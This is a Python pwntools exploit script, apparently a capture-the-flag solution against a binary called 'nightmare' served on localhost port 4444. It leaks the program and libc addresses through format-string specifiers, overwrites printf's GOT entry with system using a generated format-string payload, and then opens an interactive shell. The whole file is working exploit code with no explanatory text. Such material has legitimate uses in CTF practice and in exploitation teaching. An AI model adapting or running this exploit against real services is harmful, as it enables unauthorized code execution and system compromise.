#!/usr/bin/env python


from pwn import *

BINARY = "./nightmare"
LIBC = "./libc.so.6"
ADDR = "localhost"
PORT = 4444

splash()
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)


class Formats:
    leak_main = "%17$p"
    leak_libc = "%13$p"


class Offsets:
    main_offset = 0x1478
    libc_start_main_ret_offset = 0x270B3
    format_string_offset = 0x5


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve():
    io = conn()

    io.sendlineafter("> ", "2")
    io.sendlineafter(">> ", Formats.leak_main)
    main = int(io.recvuntil("\n")[:-1], 16)
    log.success(f"main found @: {hex(main)}")
    elf.address = main - Offsets.main_offset
    log.success(f"elf base address found @: {hex(elf.address)}")
    io.sendlineafter("> ", "")

    io.sendlineafter("> ", "2")
    io.sendlineafter(">> ", Formats.leak_libc)
    libc_start_main_ret = int(io.recvuntil("\n")[:-1], 16)
    log.success(f"__libc_start_main_ret found @: {hex(libc_start_main_ret)}")
    libc.address = libc_start_main_ret - Offsets.libc_start_main_ret_offset
    log.success(f"libc base address found @: {hex(libc.address)}")
    io.sendlineafter("> ", "")

    writes = {elf.got.printf: libc.sym.system}
    payload = fmtstr_payload(
        Offsets.format_string_offset, writes, 0, write_size="short"
    )
    io.sendlineafter("> ", "1")
    io.sendlineafter(">> ", payload)

    io.sendline("2")
    io.sendline("sh")
    io.interactive()


if __name__ == "__main__":
    solve()
